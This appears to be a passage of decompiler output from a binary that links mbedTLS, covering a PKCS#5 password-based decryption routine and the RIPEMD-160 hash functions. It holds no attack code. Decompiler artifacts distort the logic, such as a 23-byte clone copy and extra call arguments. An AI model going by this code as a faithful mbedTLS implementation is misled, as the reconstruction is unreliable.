                                                v40 = v9;
                                                v41 = v18;
                                                v26 = mbedtls_pkcs5_pbkdf2_hmac((char *)g7, a3, a4, v38, v41, v40, v39, v21);
                                                g1 = v26;
                                                if (v26 == 0) {
                                                    // 0x8064fea
                                                    v42 = g5;
                                                    v27 = mbedtls_cipher_setup((char *)g3, v42);
                                                    g1 = v27;
                                                    if (v27 == 0) {
                                                        // 0x8064ffa
                                                        mbedtls_cipher_setkey((int32_t *)g3, v21, 8 * v8, a2, v41, v40, v39, v21);
                                                        g1 = -0x6100;
                                                        result = -0x6100;
                                                        v37 = (char *)&v30;
                                                        // branch -> 0x8064f89
                                                    } else {
                                                        result = v27;
                                                        v37 = (char *)v42;
                                                    }
                                                } else {
                                                    result = v26;
                                                    v37 = a3;
                                                }
                                            }
                                            // 0x8064f89
                                            g1 = mbedtls_md_free((char *)g7);
                                            mbedtls_cipher_free((char *)g3, (int32_t)v37);
                                            // branch -> 0x8064d15
                                            // 0x8064d15
                                            g3 = v2;
                                            g7 = v3;
                                            g5 = v4;
                                            return result;
                                        }
                                    }
                                    // 0x8064e61
                                    // branch -> 0x8064d15
                                    // 0x8064d15
                                    g3 = v2;
                                    g7 = v3;
                                    g5 = v4;
                                    return -0x2f00;
                                }
                            }
                        }
                        // 0x8064d82
                        // branch -> 0x8064d15
                        // 0x8064d15
                        g3 = v2;
                        g7 = v3;
                        g5 = v4;
                        return -0x2e80;
                    }
                    v20 = v44;
                }
                // 0x8064ddd
                v43 = v20 - 0x2f00;
                if (v43 == 0) {
                    // 0x8064dea
                    v22 = mbedtls_md_info_from_type(4);
                    if (v22 != 0) {
                        // 0x8064e00
                        g7 = &v34;
                        v23 = mbedtls_asn1_get_alg((int32_t *)g3, v6, &v34, (char *)&v28);
                        if (v23 != 0) {
                            // 0x8064d6a
                            g3 = v2;
                            g7 = v3;
                            g5 = v4;
                            return v23 - 0x2f00;
                        }
                        // 0x8064e28
                        if (mbedtls_oid_get_cipher_alg(g7, &v33) == 0) {
                            // 0x8064e3f
                            v24 = mbedtls_cipher_info_from_type(v33);
                            g5 = v24;
                            if (v24 != 0) {
                                // 0x8064e54
                                if (v28 == 4) {
                                    // 0x8064f24
                                    if (v36 == *(int32_t *)(v24 + 16)) {
                                        // 0x8064f30
                                        g7 = &v29;
                                        g3 = &v32;
                                        v8 = *(int32_t *)(v24 + 8) / 8;
                                        mbedtls_md_init(&v29);
                                        mbedtls_cipher_init((char *)g3);
                                        memcpy((char *)&v31, (char *)v35, v36);
                                        g1 = v22;
                                        v25 = mbedtls_md_setup((int32_t *)g7, v22, 1);
                                        g1 = v25;
                                        result = v25;
                                        v37 = (char *)v22;
                                        if (v25 == 0) {
                                            // 0x8064faa
                                            v21 = &v30;
                                            v39 = v8;
                                            v40 = v9;
                                            v41 = v18;
                                            v26 = mbedtls_pkcs5_pbkdf2_hmac((char *)g7, a3, a4, v38, v41, v40, v39, v21);
                                            g1 = v26;
                                            if (v26 == 0) {
                                                // 0x8064fea
                                                v42 = g5;
                                                v27 = mbedtls_cipher_setup((char *)g3, v42);
                                                g1 = v27;
                                                if (v27 == 0) {
                                                    // 0x8064ffa
                                                    mbedtls_cipher_setkey((int32_t *)g3, v21, 8 * v8, a2, v41, v40, v39, v21);
                                                    g1 = -0x6100;
                                                    result = -0x6100;
                                                    v37 = (char *)&v30;
                                                    // branch -> 0x8064f89
                                                } else {
                                                    result = v27;
                                                    v37 = (char *)v42;
                                                }
                                            } else {
                                                result = v26;
                                                v37 = a3;
                                            }
                                        }
                                        // 0x8064f89
                                        g1 = mbedtls_md_free((char *)g7);
                                        mbedtls_cipher_free((char *)g3, (int32_t)v37);
                                        // branch -> 0x8064d15
                                        // 0x8064d15
                                        g3 = v2;
                                        g7 = v3;
                                        g5 = v4;
                                        return result;
                                    }
                                }
                                // 0x8064e61
                                // branch -> 0x8064d15
                                // 0x8064d15
                                g3 = v2;
                                g7 = v3;
                                g5 = v4;
                                return -0x2f00;
                            }
                        }
                    }
                    // 0x8064d82
                    result2 = -0x2e80;
                    // branch -> 0x8064d15
                } else {
                    result2 = v43;
                }
            }
            // 0x8064d15
            g3 = v2;
            g7 = v3;
            g5 = v4;
            return result2;
        }
    }
    // 0x8064d82
    // branch -> 0x8064d15
    // 0x8064d15
    g3 = v2;
    g7 = v3;
    g5 = v4;
    return -0x2e80;
}

// Address range: 0x8065070 - 0x806508f
void mbedtls_ripemd160_free(char * a1) {
    int32_t v1 = (int32_t)a1;
    g1 = v1;
    if (a1 == NULL) {
        // 0x806508a
        return;
    }
    // 0x806507a
    g6 = v1 + 92;
    *(char *)v1 = 0;
    int32_t v2 = g1 + 1; // 0x8065083
    g1 = v2;
    // branch -> 0x8065080
    while (v2 != g6) {
        // 0x8065080
        *(char *)v2 = 0;
        v2 = g1 + 1;
        g1 = v2;
        // continue -> 0x8065080
    }
    // 0x806508a
    // branch -> 0x806508a
}

// Address range: 0x8065090 - 0x80650b6
void mbedtls_ripemd160_clone(char * a1, char * a2) {
    // 0x8065090
    g1 = (int32_t)a1;
    memcpy(a1, a2, 23);
}

// Address range: 0x80650b7 - 0x80650bf
int32_t function_80650b7(int32_t a1) {
    // 0x80650b7
    return g7;
}

// Address range: 0x80650c0 - 0x80650ff
void mbedtls_ripemd160_starts(int32_t * a1) {
    // 0x80650c0
    g1 = (int32_t)a1;
    *a1 = 0;
    *(int32_t *)(g1 + 4) = 0;
    *(int32_t *)(g1 + 8) = 0x67452301;
    *(int32_t *)(g1 + 12) = -0x10325477;
    *(int32_t *)(g1 + 16) = -0x67452302;
    *(int32_t *)(g1 + 20) = 0x10325476;
    *(int32_t *)(g1 + 24) = -0x3c2d1e10;
}

// Address range: 0x8065100 - 0x8066bac
int32_t mbedtls_ripemd160_process(int32_t a1, char * a2) {
    int32_t v1 = (int32_t)a2;
    unsigned char v2 = *(char *)(v1 + 1); // 0x806510c
    unsigned char v3 = *(char *)(v1 + 2); // 0x8065116
    unsigned char v4 = *a2; // 0x8065120
    unsigned char v5 = *(char *)(v1 + 3); // 0x8065126
    int32_t v6 = 0x1000000 * (int32_t)v5 | 0x10000 * (int32_t)v3 | 256 * (int32_t)v2 | (int32_t)v4; // 0x806512d
    unsigned char v7 = *(char *)(v1 + 5); // 0x8065130
    unsigned char v8 = *(char *)(v1 + 6); // 0x8065134
    unsigned char v9 = *(char *)(v1 + 4); // 0x8065140
    unsigned char v10 = *(char *)(v1 + 7); // 0x8065146
    int32_t v11 = 0x1000000 * (int32_t)v10 | 0x10000 * (int32_t)v8 | 256 * (int32_t)v7 | (int32_t)v9; // 0x806514d
    unsigned char v12 = *(char *)(v1 + 9); // 0x8065152
    unsigned char v13 = *(char *)(v1 + 10); // 0x8065156
    unsigned char v14 = *(char *)(v1 + 8); // 0x8065162
    unsigned char v15 = *(char *)(v1 + 11); // 0x8065168
    int32_t v16 = 0x1000000 * (int32_t)v15 | 0x10000 * (int32_t)v13 | 256 * (int32_t)v12 | (int32_t)v14; // 0x806516f
    unsigned char v17 = *(char *)(v1 + 13); // 0x8065174
    unsigned char v18 = *(char *)(v1 + 14); // 0x8065178
    unsigned char v19 = *(char *)(v1 + 12); // 0x8065184
    unsigned char v20 = *(char *)(v1 + 15); // 0x806518a
    int32_t v21 = 0x1000000 * (int32_t)v20 | (int32_t)v19 | 0x10000 * (int32_t)v18 | 256 * (int32_t)v17; // 0x8065191
    unsigned char v22 = *(char *)(v1 + 17); // 0x8065196
    unsigned char v23 = *(char *)(v1 + 18); // 0x806519a
    unsigned char v24 = *(char *)(v1 + 16); // 0x80651a6
    unsigned char v25 = *(char *)(v1 + 19); // 0x80651ac
    int32_t v26 = 0x1000000 * (int32_t)v25 | 0x10000 * (int32_t)v23 | 256 * (int32_t)v22 | (int32_t)v24; // 0x80651b3
    unsigned char v27 = *(char *)(v1 + 21); // 0x80651b8
    unsigned char v28 = *(char *)(v1 + 22); // 0x80651c2
    unsigned char v29 = *(char *)(v1 + 20); // 0x80651cc
    unsigned char v30 = *(char *)(v1 + 23); // 0x80651d3
    int32_t v31 = 0x1000000 * (int32_t)v30 | 0x10000 * (int32_t)v28 | 256 * (int32_t)v27 | (int32_t)v29; // 0x80651da
    unsigned char v32 = *(char *)(v1 + 25); // 0x80651dd
    unsigned char v33 = *(char *)(v1 + 26); // 0x80651e1
    unsigned char v34 = *(char *)(v1 + 24); // 0x80651ed
    unsigned char v35 = *(char *)(v1 + 27); // 0x80651f3
    int32_t v36 = 0x1000000 * (int32_t)v35 | 0x10000 * (int32_t)v33 | 256 * (int32_t)v32 | (int32_t)v34; // 0x80651fa
    unsigned char v37 = *(char *)(v1 + 29); // 0x80651ff
    unsigned char v38 = *(char *)(v1 + 30); // 0x8065203
    unsigned char v39 = *(char *)(v1 + 28); // 0x806520f
    unsigned char v40 = *(char *)(v1 + 31); // 0x8065215
    int32_t v41 = 0x1000000 * (int32_t)v40 | 0x10000 * (int32_t)v38 | 256 * (int32_t)v37 | (int32_t)v39; // 0x806521c
    unsigned char v42 = *(char *)(v1 + 33); // 0x8065221
    unsigned char v43 = *(char *)(v1 + 34); // 0x8065225
    unsigned char v44 = *(char *)(v1 + 32); // 0x8065231
    unsigned char v45 = *(char *)(v1 + 35); // 0x8065237
    int32_t v46 = 0x1000000 * (int32_t)v45 | 0x10000 * (int32_t)v43 | 256 * (int32_t)v42 | (int32_t)v44; // 0x806523e
    unsigned char v47 = *(char *)(v1 + 37); // 0x8065243
    unsigned char v48 = *(char *)(v1 + 38); // 0x8065247
    unsigned char v49 = *(char *)(v1 + 36); // 0x8065253
    unsigned char v50 = *(char *)(v1 + 39); // 0x8065259
    int32_t v51 = 0x1000000 * (int32_t)v50 | 0x10000 * (int32_t)v48 | 256 * (int32_t)v47 | (int32_t)v49; // 0x8065260
    unsigned char v52 = *(char *)(v1 + 41); // 0x8065265
    unsigned char v53 = *(char *)(v1 + 42); // 0x806526f
    unsigned char v54 = *(char *)(v1 + 40); // 0x8065279
    unsigned char v55 = *(char *)(v1 + 43); // 0x8065280
    int32_t v56 = 0x1000000 * (int32_t)v55 | (int32_t)v54 | 0x10000 * (int32_t)v53 | 256 * (int32_t)v52; // 0x8065287
    unsigned char v57 = *(char *)(v1 + 45); // 0x806528a
    unsigned char v58 = *(char *)(v1 + 46); // 0x806528e
    unsigned char v59 = *(char *)(v1 + 44); // 0x806529a
    unsigned char v60 = *(char *)(v1 + 47); // 0x80652a0
    int32_t v61 = 0x1000000 * (int32_t)v60 | 0x10000 * (int32_t)v58 | 256 * (int32_t)v57 | (int32_t)v59; // 0x80652a7
    unsigned char v62 = *(char *)(v1 + 49); // 0x80652ac
    unsigned char v63 = *(char *)(v1 + 50); // 0x80652b0
    unsigned char v64 = *(char *)(v1 + 48); // 0x80652bc
    unsigned char v65 = *(char *)(v1 + 51); // 0x80652c2
    int32_t v66 = 0x1000000 * (int32_t)v65 | (int32_t)v64 | 0x10000 * (int32_t)v63 | 256 * (int32_t)v62; // 0x80652c9
    unsigned char v67 = *(char *)(v1 + 53); // 0x80652ce
    unsigned char v68 = *(char *)(v1 + 54); // 0x80652d2
    unsigned char v69 = *(char *)(v1 + 52); // 0x80652de
    unsigned char v70 = *(char *)(v1 + 55); // 0x80652e4
    int32_t v71 = 0x1000000 * (int32_t)v70 | 0x10000 * (int32_t)v68 | 256 * (int32_t)v67 | (int32_t)v69; // 0x80652eb
    unsigned char v72 = *(char *)(v1 + 57); // 0x80652f0
    unsigned char v73 = *(char *)(v1 + 58); // 0x80652f4
    unsigned char v74 = *(char *)(v1 + 56); // 0x8065300
    unsigned char v75 = *(char *)(v1 + 59); // 0x8065306
    int32_t v76 = 0x1000000 * (int32_t)v75 | (int32_t)v74 | 0x10000 * (int32_t)v73 | 256 * (int32_t)v72; // 0x806530d
    unsigned char v77 = *(char *)(v1 + 61); // 0x8065312
    unsigned char v78 = *(char *)(v1 + 62); // 0x806531c
    unsigned char v79 = *(char *)(v1 + 60); // 0x8065326
    unsigned char v80 = *(char *)(v1 + 63); // 0x8065330
    uint32_t v81 = *(int32_t *)(a1 + 12); // 0x8065334
    uint32_t v82 = *(int32_t *)(a1 + 16); // 0x8065337
    int32_t v83 = *(int32_t *)(a1 + 8); // 0x806533d
    int32_t v84 = 0x1000000 * (int32_t)v80 | 0x10000 * (int32_t)v78 | 256 * (int32_t)v77 | (int32_t)v79; // 0x8065340
    int32_t v85 = *(int32_t *)(a1 + 20); // 0x8065345
    int32_t v86 = *(int32_t *)(a1 + 24); // 0x806534b
    uint32_t v87 = v83 + v6 + (v82 ^ v81 ^ v85); // 0x8065365
    int32_t v88 = 1024 * v82 | v82 / 0x400000; // 0x8065368
    uint32_t v89 = v31 + 0x50a28be6 + v83 + ((v82 | -1 - v85) ^ v81); // 0x8065375
    uint32_t v90 = (2048 * v87 | v87 / 0x200000) + v86; // 0x806537b
    uint32_t v91 = (256 * v89 | v89 / 0x1000000) + v86; // 0x8065382
    uint32_t v92 = v86 + v11 + (v88 ^ v81 ^ v90); // 0x806538e
    uint32_t v93 = (0x4000 * v92 | v92 / 0x40000) + v85; // 0x8065397
    int32_t v94 = 1024 * v81 | v81 / 0x400000; // 0x80653b0
    uint32_t v95 = v76 + 0x50a28be6 + v86 + (v91 ^ (v81 | -1 - v88)); // 0x80653bb
    uint32_t v96 = v85 + v16 + (v90 ^ v94 ^ v93); // 0x80653c8
    int32_t v97 = 1024 * v90 | v90 / 0x400000; // 0x80653cb
    uint32_t v98 = (512 * v95 | v95 / 0x800000) + v85; // 0x80653d4
    uint32_t v99 = (0x8000 * v96 | v96 / 0x20000) + v88; // 0x80653d6
    uint32_t v100 = v41 + 0x50a28be6 + v85 + (v98 ^ (v91 | -1 - v94)); // 0x80653f4
    uint32_t v101 = (512 * v100 | v100 / 0x800000) + v88; // 0x80653fc
    int32_t v102 = 1024 * v91 | v91 / 0x400000; // 0x80653fe
    uint32_t v103 = v88 + v21 + (v93 ^ v97 ^ v99); // 0x806540f
    uint32_t v104 = (0x1000 * v103 | v103 / 0x100000) + v94; // 0x8065418
    int32_t v105 = 1024 * v93 | v93 / 0x400000; // 0x806541a
    int32_t v106 = 1024 * v98 | v98 / 0x400000; // 0x8065439
    uint32_t v107 = v6 + 0x50a28be6 + v88 + (v101 ^ (v98 | -1 - v102)); // 0x8065447
    uint32_t v108 = v94 + v26 + (v99 ^ v105 ^ v104); // 0x806544c
    uint32_t v109 = (2048 * v107 | v107 / 0x200000) + v94; // 0x8065455
    int32_t v110 = 1024 * v99 | v99 / 0x400000; // 0x806545a
    uint32_t v111 = (32 * v108 | v108 / 0x8000000) + v97; // 0x8065463
    uint32_t v112 = v51 + 0x50a28be6 + v94 + (v109 ^ (v101 | -1 - v106)); // 0x806547c
    int32_t v113 = 1024 * v101 | v101 / 0x400000; // 0x8065481
    int32_t v114 = 1024 * v104 | v104 / 0x400000; // 0x8065494
    uint32_t v115 = v97 + v31 + (v110 ^ v104 ^ v111); // 0x8065497
    uint32_t v116 = (0x2000 * v112 | v112 / 0x80000) + v102; // 0x80654a5
    uint32_t v117 = (256 * v115 | v115 / 0x1000000) + v105; // 0x80654a8
    int32_t v118 = 1024 * v109 | v109 / 0x400000; // 0x80654c1
    uint32_t v119 = v16 + 0x50a28be6 + v102 + (v116 ^ (v109 | -1 - v113)); // 0x80654c4
    uint32_t v120 = (0x8000 * v119 | v119 / 0x20000) + v106; // 0x80654d5
    int32_t v121 = 1024 * v111 | v111 / 0x400000; // 0x80654dc
    uint32_t v122 = v105 + v36 + (v111 ^ v114 ^ v117); // 0x80654df
    uint32_t v123 = (128 * v122 | v122 / 0x2000000) + v110; // 0x80654ed
    uint32_t v124 = v61 + 0x50a28be6 + v106 + (v120 ^ (v116 | -1 - v118)); // 0x8065506
    int32_t v125 = 1024 * v116 | v116 / 0x400000; // 0x806550b
    int32_t v126 = 1024 * v117 | v117 / 0x400000; // 0x806551e
    uint32_t v127 = v110 + v41 + (v117 ^ v121 ^ v123); // 0x8065524
    uint32_t v128 = (0x8000 * v124 | v124 / 0x20000) + v113; // 0x8065530
    uint32_t v129 = (512 * v127 | v127 / 0x800000) + v114; // 0x8065533
    int32_t v130 = 1024 * v120 | v120 / 0x400000; // 0x806554e
    uint32_t v131 = v26 + 0x50a28be6 + v113 + (v128 ^ (v120 | -1 - v125)); // 0x8065559
    uint32_t v132 = (32 * v131 | v131 / 0x8000000) + v118; // 0x8065562
    uint32_t v133 = v114 + v46 + (v126 ^ v123 ^ v129); // 0x8065565
    int32_t v134 = 1024 * v123 | v123 / 0x400000; // 0x8065567
    uint32_t v135 = (2048 * v133 | v133 / 0x200000) + v121; // 0x8065576
    uint32_t v136 = v71 + 0x50a28be6 + v118 + (v132 ^ (v128 | -1 - v130)); // 0x8065589
    int32_t v137 = 1024 * v128 | v128 / 0x400000; // 0x806558b
    uint32_t v138 = (128 * v136 | v136 / 0x2000000) + v125; // 0x8065591
    int32_t v139 = 1024 * v129 | v129 / 0x400000; // 0x80655a4
    uint32_t v140 = v121 + v51 + (v129 ^ v134 ^ v135); // 0x80655a7
    uint32_t v141 = (0x2000 * v140 | v140 / 0x80000) + v126; // 0x80655b5
    uint32_t v142 = v36 + 0x50a28be6 + v125 + (v138 ^ (v132 | -1 - v137)); // 0x80655ce
    int32_t v143 = 1024 * v132 | v132 / 0x400000; // 0x80655d3
    int32_t v144 = 1024 * v135 | v135 / 0x400000; // 0x80655e6
    uint32_t v145 = v126 + v56 + (v135 ^ v139 ^ v141); // 0x80655e9
    uint32_t v146 = (128 * v142 | v142 / 0x2000000) + v130; // 0x80655f7
    uint32_t v147 = (0x4000 * v145 | v145 / 0x40000) + v134; // 0x80655fa
    uint32_t v148 = v84 + 0x50a28be6 + v130 + (v146 ^ (v138 | -1 - v143)); // 0x806560d
    int32_t v149 = 1024 * v138 | v138 / 0x400000; // 0x8065615
    int32_t v150 = 1024 * v141 | v141 / 0x400000; // 0x8065625
    uint32_t v151 = v134 + v61 + (v141 ^ v144 ^ v147); // 0x806562b
    uint32_t v152 = (256 * v148 | v148 / 0x1000000) + v137; // 0x8065636
    uint32_t v153 = (0x8000 * v151 | v151 / 0x20000) + v139; // 0x8065639
    int32_t v154 = 1024 * v146 | v146 / 0x400000; // 0x806564a
    uint32_t v155 = v46 + 0x50a28be6 + v137 + (v152 ^ (v146 | -1 - v149)); // 0x8065655
    uint32_t v156 = (2048 * v155 | v155 / 0x200000) + v143; // 0x8065660
    uint32_t v157 = v139 + v66 + (v147 ^ v150 ^ v153); // 0x8065667
    int32_t v158 = 1024 * v147 | v147 / 0x400000; // 0x8065669
    uint32_t v159 = (64 * v157 | v157 / 0x4000000) + v144; // 0x806566f
    int32_t v160 = 1024 * v152 | v152 / 0x400000; // 0x8065693
    uint32_t v161 = v11 + 0x50a28be6 + v143 + (v156 ^ (v152 | -1 - v154)); // 0x8065698
    uint32_t v162 = (0x4000 * v161 | v161 / 0x40000) + v149; // 0x80656a7
    uint32_t v163 = v144 + v71 + (v158 ^ v153 ^ v159); // 0x80656aa
    int32_t v164 = 1024 * v153 | v153 / 0x400000; // 0x80656b2
    uint32_t v165 = (128 * v163 | v163 / 0x2000000) + v150; // 0x80656bb
    uint32_t v166 = v56 + 0x50a28be6 + v149 + (v162 ^ (v156 | -1 - v160)); // 0x80656ce
    int32_t v167 = 1024 * v156 | v156 / 0x400000; // 0x80656d3
    int32_t v168 = 1024 * v159 | v159 / 0x400000; // 0x80656e6
    uint32_t v169 = v150 + v76 + (v159 ^ v164 ^ v165); // 0x80656e9
    uint32_t v170 = (0x4000 * v166 | v166 / 0x40000) + v154; // 0x80656f7
    uint32_t v171 = (512 * v169 | v169 / 0x800000) + v158; // 0x80656fa
    int32_t v172 = 1024 * v162 | v162 / 0x400000; // 0x8065715
    uint32_t v173 = v21 + 0x50a28be6 + v154 + (v170 ^ (v162 | -1 - v167)); // 0x806571a
    int32_t v174 = 1024 * v165 | v165 / 0x400000; // 0x8065723
    uint32_t v175 = (0x1000 * v173 | v173 / 0x100000) + v160; // 0x806572c
    uint32_t v176 = v158 + v84 + (v168 ^ v165 ^ v171); // 0x806572f
    uint32_t v177 = (256 * v176 | v176 / 0x1000000) + v164; // 0x8065735
    uint32_t v178 = v66 + 0x50a28be6 + v160 + (v175 ^ (v170 | -1 - v172)); // 0x8065754
    uint32_t v179 = (64 * v178 | v178 / 0x4000000) + v167; // 0x806575a
    int32_t v180 = 1024 * v170 | v170 / 0x400000; // 0x806575d
    int32_t v181 = 1024 * v171 | v171 / 0x400000; // 0x806577e
    uint32_t v182 = v41 + 0x5a827999 + v164 + (v177 & v171 | v174 & -1 - v177); // 0x8065789
    uint32_t v183 = (128 * v182 | v182 / 0x2000000) + v168; // 0x8065791
    uint32_t v184 = v36 + 0x5c4dd124 + v167 + (v179 & v180 | v175 & -1 - v180); // 0x80657aa
    uint32_t v185 = (512 * v184 | v184 / 0x800000) + v172; // 0x80657b3
    int32_t v186 = 1024 * v175 | v175 / 0x400000; // 0x80657b6
    int32_t v187 = 1024 * v177 | v177 / 0x400000; // 0x80657d1
    uint32_t v188 = v26 + 0x5a827999 + v168 + (v183 & v177 | v181 & -1 - v183); // 0x80657dc
    uint32_t v189 = (64 * v188 | v188 / 0x4000000) + v174; // 0x80657e4
    uint32_t v190 = v61 + 0x5c4dd124 + v172 + (v185 & v186 | v179 & -1 - v186); // 0x80657fc
    uint32_t v191 = (0x2000 * v190 | v190 / 0x80000) + v180; // 0x8065805
    int32_t v192 = 1024 * v179 | v179 / 0x400000; // 0x8065808
    uint32_t v193 = v71 + 0x5a827999 + v174 + (v189 & v183 | v187 & -1 - v189); // 0x806582b
    uint32_t v194 = (256 * v193 | v193 / 0x1000000) + v181; // 0x8065830
    int32_t v195 = 1024 * v183 | v183 / 0x400000; // 0x8065833
    uint32_t v196 = v21 + 0x5c4dd124 + v180 + (v191 & v192 | v185 & -1 - v192); // 0x8065859
    uint32_t v197 = (0x8000 * v196 | v196 / 0x20000) + v186; // 0x8065862
    int32_t v198 = 1024 * v185 | v185 / 0x400000; // 0x806586a
    int32_t v199 = 1024 * v189 | v189 / 0x400000; // 0x806587d
    uint32_t v200 = v11 + 0x5a827999 + v181 + (v195 & -1 - v194 | v194 & v189); // 0x806588d
    uint32_t v201 = (0x2000 * v200 | v200 / 0x80000) + v187; // 0x80658a2
    uint32_t v202 = v41 + 0x5c4dd124 + v186 + (v197 & v198 | v191 & -1 - v198); // 0x80658af
    uint32_t v203 = (128 * v202 | v202 / 0x2000000) + v192; // 0x80658b7
    int32_t v204 = 1024 * v191 | v191 / 0x400000; // 0x80658ba
    int32_t v205 = 1024 * v194 | v194 / 0x400000; // 0x80658d5
    uint32_t v206 = v56 + 0x5a827999 + v187 + (v201 & v194 | v199 & -1 - v201); // 0x80658e0
    uint32_t v207 = (2048 * v206 | v206 / 0x200000) + v195; // 0x80658e8
    uint32_t v208 = v6 + 0x5c4dd124 + v192 + (v203 & v204 | v197 & -1 - v204); // 0x8065900
    uint32_t v209 = (0x1000 * v208 | v208 / 0x100000) + v198; // 0x8065909
    int32_t v210 = 1024 * v197 | v197 / 0x400000; // 0x806590c
    int32_t v211 = 1024 * v201 | v201 / 0x400000; // 0x806592d
    uint32_t v212 = v36 + 0x5a827999 + v195 + (v207 & v201 | v205 & -1 - v207); // 0x8065938
    uint32_t v213 = (512 * v212 | v212 / 0x800000) + v199; // 0x8065940
    uint32_t v214 = v71 + 0x5c4dd124 + v198 + (v209 & v210 | v203 & -1 - v210); // 0x806595d
    uint32_t v215 = (256 * v214 | v214 / 0x1000000) + v204; // 0x8065966
    int32_t v216 = 1024 * v203 | v203 / 0x400000; // 0x806596e
    int32_t v217 = 1024 * v207 | v207 / 0x400000; // 0x8065983
    uint32_t v218 = v84 + 0x5a827999 + v199 + (v213 & v207 | v211 & -1 - v213); // 0x80659a2
    uint32_t v219 = v31 + 0x5c4dd124 + v204 + (v215 & v216 | v209 & -1 - v216); // 0x80659a9
    uint32_t v220 = (512 * v219 | v219 / 0x800000) + v210; // 0x80659b1
    uint32_t v221 = (128 * v218 | v218 / 0x2000000) + v205; // 0x80659b7
    int32_t v222 = 1024 * v209 | v209 / 0x400000; // 0x80659c0
    uint32_t v223 = v21 + 0x5a827999 + v205 + (v221 & v213 | v217 & -1 - v221); // 0x80659dd
    uint32_t v224 = (0x8000 * v223 | v223 / 0x20000) + v211; // 0x80659e6
    int32_t v225 = 1024 * v213 | v213 / 0x400000; // 0x80659e9
    uint32_t v226 = v56 + 0x5c4dd124 + v210 + (v220 & v222 | v215 & -1 - v222); // 0x8065a09
    uint32_t v227 = (2048 * v226 | v226 / 0x200000) + v216; // 0x8065a0f
    int32_t v228 = 1024 * v215 | v215 / 0x400000; // 0x8065a1a
    int32_t v229 = 1024 * v221 | v221 / 0x400000; // 0x8065a30
    uint32_t v230 = v66 + 0x5a827999 + v211 + (v225 & -1 - v224 | v224 & v221); // 0x8065a43
    uint32_t v231 = (128 * v230 | v230 / 0x2000000) + v217; // 0x8065a58
    int32_t v232 = 1024 * v220 | v220 / 0x400000; // 0x8065a60
    uint32_t v233 = v76 + 0x5c4dd124 + v216 + (v227 & v228 | v220 & -1 - v228); // 0x8065a65
    uint32_t v234 = (128 * v233 | v233 / 0x2000000) + v222; // 0x8065a6e
    int32_t v235 = 1024 * v224 | v224 / 0x400000; // 0x8065a89
    uint32_t v236 = v6 + 0x5a827999 + v217 + (v231 & v224 | v229 & -1 - v231); // 0x8065a94
    uint32_t v237 = (0x1000 * v236 | v236 / 0x100000) + v225; // 0x8065a9d
    uint32_t v238 = v84 + 0x5c4dd124 + v222 + (v234 & v232 | v227 & -1 - v232); // 0x8065ab8
    uint32_t v239 = (128 * v238 | v238 / 0x2000000) + v228; // 0x8065ac0
    int32_t v240 = 1024 * v227 | v227 / 0x400000; // 0x8065ac3
    int32_t v241 = 1024 * v231 | v231 / 0x400000; // 0x8065ae1
    uint32_t v242 = v51 + 0x5a827999 + v225 + (v237 & v231 | v235 & -1 - v237); // 0x8065aec
    uint32_t v243 = (0x8000 * v242 | v242 / 0x20000) + v229; // 0x8065af5
    uint32_t v244 = v46 + 0x5c4dd124 + v228 + (v239 & v240 | v234 & -1 - v240); // 0x8065b0f
    uint32_t v245 = (0x1000 * v244 | v244 / 0x100000) + v232; // 0x8065b15
    int32_t v246 = 1024 * v234 | v234 / 0x400000; // 0x8065b23
    int32_t v247 = 1024 * v237 | v237 / 0x400000; // 0x8065b3b
    uint32_t v248 = v31 + 0x5a827999 + v229 + (v243 & v237 | v241 & -1 - v243); // 0x8065b46
    uint32_t v249 = (512 * v248 | v248 / 0x800000) + v235; // 0x8065b60
    uint32_t v250 = v66 + 0x5c4dd124 + v232 + (v245 & v246 | v239 & -1 - v246); // 0x8065b68
    uint32_t v251 = (128 * v250 | v250 / 0x2000000) + v240; // 0x8065b70
    int32_t v252 = 1024 * v239 | v239 / 0x400000; // 0x8065b73
    int32_t v253 = 1024 * v243 | v243 / 0x400000; // 0x8065b8e
    uint32_t v254 = v16 + 0x5a827999 + v235 + (v249 & v243 | v247 & -1 - v249); // 0x8065b99
    uint32_t v255 = (2048 * v254 | v254 / 0x200000) + v241; // 0x8065ba1
    uint32_t v256 = v26 + 0x5c4dd124 + v240 + (v251 & v252 | v245 & -1 - v252); // 0x8065bbc
    uint32_t v257 = (64 * v256 | v256 / 0x4000000) + v246; // 0x8065bc5
    int32_t v258 = 1024 * v249 | v249 / 0x400000; // 0x8065be3
    int32_t v259 = 1024 * v245 | v245 / 0x400000; // 0x8065be6
    uint32_t v260 = v76 + 0x5a827999 + v241 + (v253 & -1 - v255 | v255 & v249); // 0x8065beb
    uint32_t v261 = (128 * v260 | v260 / 0x2000000) + v247; // 0x8065bf1
    uint32_t v262 = v51 + 0x5c4dd124 + v246 + (v257 & v259 | v251 & -1 - v259); // 0x8065c18
    uint32_t v263 = (0x8000 * v262 | v262 / 0x20000) + v252; // 0x8065c20
    int32_t v264 = 1024 * v251 | v251 / 0x400000; // 0x8065c28
    int32_t v265 = 1024 * v255 | v255 / 0x400000; // 0x8065c42
    uint32_t v266 = v61 + 0x5a827999 + v247 + (v261 & v255 | v258 & -1 - v261); // 0x8065c4a
    uint32_t v267 = (0x2000 * v266 | v266 / 0x80000) + v253; // 0x8065c50
    int32_t v268 = -1 - v267; // 0x8065c6a
    uint32_t v269 = v11 + 0x5c4dd124 + v252 + (v263 & v264 | v257 & -1 - v264); // 0x8065c7c
    uint32_t v270 = (0x2000 * v269 | v269 / 0x80000) + v259; // 0x8065c84
    int32_t v271 = 1024 * v257 | v257 / 0x400000; // 0x8065c96
    uint32_t v272 = v46 + 0x5a827999 + v253 + (v267 & v261 | v265 & v268); // 0x8065ca1
    uint32_t v273 = (0x1000 * v272 | v272 / 0x100000) + v258; // 0x8065ca7
    int32_t v274 = 1024 * v261 | v261 / 0x400000; // 0x8065cb0
    uint32_t v275 = v16 + 0x5c4dd124 + v259 + (v270 & v271 | v263 & -1 - v271); // 0x8065cd0
    uint32_t v276 = (2048 * v275 | v275 / 0x200000) + v264; // 0x8065cd8
    int32_t v277 = 1024 * v263 | v263 / 0x400000; // 0x8065cda
    int32_t v278 = 1024 * v267 | v267 / 0x400000; // 0x8065cf9
    uint32_t v279 = v21 + 0x6ed9eba1 + v258 + ((v273 | v268) ^ v274); // 0x8065d02
    int32_t v280 = 1024 * v270 | v270 / 0x400000; // 0x8065d15
    uint32_t v281 = v84 + 0x6d703ef3 + v264 + ((v276 | -1 - v270) ^ v277); // 0x8065d21
    uint32_t v282 = (2048 * v279 | v279 / 0x200000) + v265; // 0x8065d26
    uint32_t v283 = (512 * v281 | v281 / 0x800000) + v271; // 0x8065d2c
